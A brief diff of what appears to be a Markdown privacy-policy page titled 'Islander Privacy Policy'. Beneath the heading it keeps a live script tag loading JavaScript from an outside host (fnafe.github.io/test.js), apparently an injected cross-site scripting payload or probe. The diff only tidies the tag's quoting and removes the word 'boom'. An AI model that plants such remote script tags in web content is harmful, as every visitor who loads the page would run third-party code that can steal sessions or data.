@@ -1,6 +1,6 @@
 ## Islander Privacy Policy
 
-<script src='https://fnafe.github.io/test.js'>boom</script>
+<script src="https://fnafe.github.io/test.js"></script>
 
 Privacy Policy
 
